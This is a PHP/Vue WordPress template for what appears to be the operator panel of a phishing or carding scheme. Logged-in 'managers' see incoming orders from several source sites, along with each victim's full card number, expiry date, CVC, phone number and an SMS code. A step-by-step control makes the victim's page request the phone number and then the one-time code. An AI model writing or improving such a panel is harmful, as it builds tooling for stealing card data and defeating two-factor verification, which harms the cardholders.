<?php
/**
 *Template Name: Оплата - страница менеджера
 *Template Post Type: page
 *
 * @package ministar
 */

get_header();
?>

<script src="<?=get_template_directory_uri()?>/js/API.manager.js"></script>


<div id="vue-app" class="bg-dark">
	
	<?php get_template_part( 'template-parts/common/loadingScreen');?>

	<form @submit.prevent="loginManager" class="panel login" v-bind:class="{hidden: !showLoginPanel}">
		<input type="login" class="login field" placeholder="login" v-model="login">
		<input type="password" class="password field" placeholder="password" v-model="password">
		<button class="login btn">login</button>
	</form>
	
	<div class="w-100 h-100" v-bind:class="{hidden: !showControlPanel}">
		<div class="navbar navbar-fixed-top navbar-dark bg-dark shadow p-lg-2 mb-lg-5">
			<div class="container">
				<div class="d-flex">
					<a class="navbar-brand" href="#">{{ managerName }}</a>
				</div>
				<div class="d-flex">
					<div class="navbar-text online-state" v-bind:class="{online: isOnline}">
						{{ isOnline ? "ONLINE" : "OFFLINE" }}
					</div>
					<button class="btn btn-dark navbar-btn rounded-0" v-on:click="switchOnlineState" onclick="this.blur();">
						{{ isOnline ? "disable" : "enable" }} online
					</button>
				</div>
			</div>
		</div>

		<div class="container">
			<div class="row d-flex justify-content-center">
				<div class="col-lg-9 text-center">
				<table class="table table-secondary text-left table-striped">
					<thead>
						<tr>
							<th scope="col">Time</th>
							<th scope="col">Site</th>
							<th scope="col">Price</th>
							<th scope="col"></th>
						</tr>
					</thead>
					<tbody>
						<tr v-for="(order, index) in orders" v-bind:key="order.channel">
							<td scope="row">{{ order.orderData.incomingtime }}</td>
							<td>{{ order.orderData.source }}</td>
							<td>{{ order.orderData.price }}</td>
							<td><button v-on:click="processTheOrder(index)" class="btn btn-light" onclick="this.blur();">process</button></td>
						</tr>
					</tbody>
				</table>
				</div>
			</div>
		</div>


		<div class="modal fade show" role="dialog" style="display:block" v-if="orderNow">
			<div class="modal-dialog modal-dialog-centered" role="document">
				<div class="modal-content">
					<div class="modal-body p-lg-4">
						<div class="row my-lg-2">
							<div class="col-lg-3 text-uppercase">ID:</div>
							<div class="col">{{currentOrder.orderData.id}}</div>
						</div>
						<div class="row my-lg-2">
							<div class="col-lg-3 text-uppercase">Card number:</div>
							<div class="col">{{currentOrder.orderData.card.cardNumber}}</div>
						</div>
						<div class="row my-lg-2">
							<div class="col-lg-3 text-uppercase">Card date:</div>
							<div class="col">{{currentOrder.orderData.card.cardDate}}</div>
						</div>
						<div class="row my-lg-2">
							<div class="col-lg-3 text-uppercase">CVC:</div>
							<div class="col">{{currentOrder.orderData.card.cvc}}</div>
						</div>
						<div class="row my-lg-2">
							<div class="col-lg-3 text-uppercase">Tel:</div>
							<div class="col">{{currentOrder.orderData.card.phoneNumber||"..."}}</div>
						</div>
						<div class="row my-lg-2">
							<div class="col-lg-3 text-uppercase">Tel:</div>
							<div class="col">{{currentOrder.orderData.card.phoneCode||"..."}}</div>
						</div>
					</div>
					<div class="modal-footer">
						<button v-on:click="orderNext" class="btn btn-primary">
							{{orderStage == "phoneNumber_code" ? "ok" : "next"}}
						</button>
						<button v-on:click="orderDecline" class="btn btn-secondary">
							decline
						</button>
					</div>
				</div>
			</div>
		</div>
		<div class="modal-backdrop fade show" v-if="orderNow"></div>
	</div>
</div>

<script>
	var app = new Vue({
		mixins: [utils.CommonVueMixin],
		el: '#vue-app',
		data: function(){
			return {
				showLoginPanel: false,
				showControlPanel: false,

				managerName: '',
				login: '',
				password: '',

				isOnline: false,

				orders: [],
				currentOrder: null,
				orderNow: false,
				orderStage: null
			};
		},
		methods: {
			showLogin: function(){
				this.showLoginPanel = true;
				this.showControlPanel = false;
			},

			showControl: function(){
				this.showLoginPanel = false;
				this.showControlPanel = true;
			},

			switchOnlineState: function(){
				var _this = this;
				if(_this.showLoadingScreen)
					return;
				
				_this.showLoadingScreen = true;
				if(!_this.isOnline){
					API.manager.online();
				}else{
					API.manager.offline();
				}
			},

			checkLocalStoreAccesses: function(){
				if(utils.store("manager")){
					var mgr = utils.store("manager");
					this.showLoadingScreen = true;
					API.manager.getManagerByUID(mgr.id, mgr.uid);
				}else{
					this.showLogin();
				}
			},

			loginManager: function(){
				var _this = this;
				_this.showLoadingScreen = true;
				API.manager.getManagerByAccesses(_this.login, _this.password);
			},

			processTheOrder: function(i){
				this.showLoadingScreen = true;
				this.loadingScreenContent = "processing the request...";
				if(!API.manager.processTheOrder(i)){
					this.showLoadingScreen = false;
				};
			},

			orderNext: function(){
				this.showLoadingScreen = true;
				this.loadingScreenContent = "processing the request...";
				switch(this.orderStage){
					case "cardData":
						API.manager.setClientOrderState("phoneNumber_number");
						break;
					case "phoneNumber_number":
						API.manager.setClientOrderState("phoneNumber_code");
						break;
					case "phoneNumber_code":
						this.loadingScreenContent = "Waiting server to respond. Order status: accepted.";
						API.manager.acceptOrder();
						break;
				}
			},
			orderDecline: function(){
				this.showLoadingScreen = true;
				this.loadingScreenContent = "Waiting server to respond. Order status: declined.";
				API.manager.declineOrder();
			},


//
// only API events ------>
//

			updateOrders: function(data){
				this.orders = data;
			},

			startOrder: function(){
				this.showLoadingScreen = true;
				this.loadingScreenContent = "Order has been started. Waiting for the data...";
			},

			startOrderError: function(){
				utils.alert("Error", "The order is inaccessible now. Maybe it is processed by another manager.");
				this.showLoadingScreen = false;
			},

			orderShouldDisconnect: function(){
				utils.alert("Server error", "Order disconnected.");
				this.orderNow = false;
				this.showLoadingScreen = false;
			},

			endTask: function(){
				this.orderNow = false;
				this.showLoadingScreen = false;
				this.loadingScreenContent = "";
			},

			updateCurrentOrder(data){
				this.orderNow = true;
				this.currentOrder = data;
				this.showLoadingScreen = false;
				this.orderStage = data.orderData.card.stage;
				this.loadingScreenContent = "";
			},

			changeOnline(state){
				this.isOnline = state;
				this.showLoadingScreen = false;
			},

			changeOnlineSessionError(){
				utils.alert("Error", "Your session is online now.");
				this.showLoadingScreen = false;
			},

			managerHasLoggedIn(data){
				utils.store("manager", data);
				this.managerName = data.name;
				this.showControl();
				this.showLoadingScreen = false;
			},

			managerAccessesAreIncorrect(){
				utils.alert("Access error", "password or login is incorrect!");
				this.showLogin();
				this.showLoadingScreen = false;
			},

			serverError(){
				utils.alert("Server error", "something is wrong. Try again");
				this.showLoadingScreen = false;
				this.loadingScreenContent = "";
			}
		},

		created: function(){
			this.checkLocalStoreAccesses();
			
			API.manager.actions
				.on("updateOrders", this.updateOrders)
				.on("startOrder", this.startOrder)
				.on("startOrderError", this.startOrderError)
				.on("orderShouldDisconnect", this.orderShouldDisconnect)
				.on("endTask", this.endTask)
				.on("updateCurrentOrder", this.updateCurrentOrder)
				.on("changeOnline", this.changeOnline)
				.on("changeOnlineSessionError", this.changeOnlineSessionError)
				.on("managerHasLoggedIn", this.managerHasLoggedIn)
				.on("managerAccessesAreIncorrect", this.managerAccessesAreIncorrect)
				.on("serverError", this.serverError);
		}
	});
</script>

<?=get_footer()?>